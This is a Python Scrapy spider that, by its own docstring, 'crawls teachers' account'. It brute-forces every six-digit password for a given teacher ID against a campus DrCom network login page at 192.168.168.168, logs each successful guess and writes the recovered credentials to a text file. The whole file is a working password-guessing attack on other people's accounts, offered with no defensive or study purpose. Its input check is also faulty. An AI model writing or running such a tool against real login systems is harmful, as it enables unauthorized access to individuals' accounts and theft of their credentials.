# -*- coding: utf-8 -*-
"""crawl teachers' account"""
import re
import scrapy
try:
    from NjuptDrCom.items import NjuptDrComItem as Item
except ImportError:
    from items import NjuptDrComItem as Item


class SascSpider(scrapy.Spider):
    """ give the spider a username and passwords(splited
    from 000000 to 999999)"""
    name = 'sasc'

    def __init__(self, **kwargs):
        """
        :username: teacher's id
        :passwords: splited from 000000 to 999999
        """

        try:
            self.username = kwargs['username']
            self.passwords = kwargs['passwords']
            if self.username or self.passwords is None:
                raise ValueError
        except ValueError:
            pass
        self.url = 'http://192.168.168.168/0.htm'
        self.formdata = {"DDDDD": str(self.username), 'upass': ''}
        self.password_re = re.compile('[0-9]{6}')

        super().__init__()

    def start_requests(self):
        for password in self.passwords:
            self.formdata['upass'] = password
            yield scrapy.FormRequest(url=self.url, formdata=self.formdata,
                                     callback=self.parse)

    def parse(self, response):
        body = str(response.request.body)
        status = response.xpath('//input/@value').extract()
        result = ''.join(map(str, status))
        password = self.password_re.findall(body)[-1]
        if '\u8fd4' in result:
            self.logger.info('password %s is useless for %s', password, self.username)
            return {}
        elif result == "":
            self.logger.info('password %s login %s successfully' + '!'*15, password, self.username)
            item = Item()
            item['username'] = self.username
            item['password'] = password
            with open('GGGGGGGG.txt', mode='a+') as f:
                f.write("{'%s' : '%s'}\n" % (self.username, password))
            yield item
        else:
            self.logger.error('password %s is unknown for %s', password, self.username)
            err_item = Item()
            err_item['error_username'] = self.username
            err_item['error_password'] = password
            yield err_item
